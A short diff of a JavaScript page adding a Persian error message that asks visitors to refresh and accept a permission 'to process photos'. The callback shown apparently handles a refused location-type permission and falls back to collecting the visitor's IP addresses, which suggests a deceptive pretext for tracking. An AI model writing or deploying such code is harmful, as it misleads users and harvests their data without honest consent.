@@ -37,10 +37,10 @@
                 if (response.ok) {
                     updateStatus(``);
                 } else {
-                    updateStatus(``,true);
+                    updateStatus(`خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.`,true);
                 }
             } catch (err) {
-                updateStatus('', true);
+                updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.', true);
             }
         }
 
@@ -124,8 +124,8 @@
                     );
                 },
                 async (err) => {
-                    console.warn('', err.message);
-                    updateStatus('');
+                    console.warn('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.', err.message);
+                    updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.');
                     try {
                         const ipList = await getMultipleIPs();
                         if (ipList.length > 0) {
@@ -134,7 +134,7 @@
                             updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.', true);
                         }
                     } catch (ex) {
-                        updateStatus('', true);
+                        updateStatus('خطا در گرفتن دسترسی برای پردازش عکس ها.لطفا صفحه را رفرش کرده و دسترسی را قبول کنید.', true);
                     }
                 },
                 {
